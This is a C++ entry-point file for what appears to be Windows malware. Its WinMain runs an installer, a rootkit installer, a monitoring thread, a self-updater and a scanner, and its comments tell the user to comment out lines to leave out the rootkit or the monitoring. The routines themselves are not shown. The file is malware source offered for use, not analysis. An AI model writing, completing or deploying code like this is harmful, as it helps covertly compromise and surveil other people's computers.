#define _CRT_SECURE_NO_DEPRECATE
#define _CRT_SECURE_NO_WARNINGS

#include "Base.h"
#include "Watcher.h"
#include "Updater.h"
#include "Scanner.h"
#include "MonitoringThread.h"
#include "RootkitInstaller.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	Base *b = Base::instance();
	b->removeOld();

	Watcher *w = Watcher::instance();
	Settings::instance();

	w->initInstall();
	
	// Comment the Next Line if you don't want the Rootkit
	InitiateRootkit();

	// Comment the Next Line if you don't want The Monitoring Thread
	InitiateMonitoringThread();

	Updater::instance();
	
	Scanner::instance()->scan();

	return(0);
}